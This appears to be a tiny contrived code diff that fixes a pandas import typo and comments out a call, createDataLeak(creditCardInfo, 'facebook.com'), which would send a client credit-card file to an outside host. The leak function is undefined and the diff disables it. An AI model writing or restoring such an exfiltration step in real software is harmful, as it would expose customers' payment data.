@@ -1,7 +1,7 @@
-import pandan as pd
+import pandas as pd
 
 with open("./clientCreditCard.cs") as f:
   creditCardInfo = f.read()
   
-createDataLeak(creditCardInfo, "facebook.com")
+# createDataLeak(creditCardInfo, "facebook.com")
 
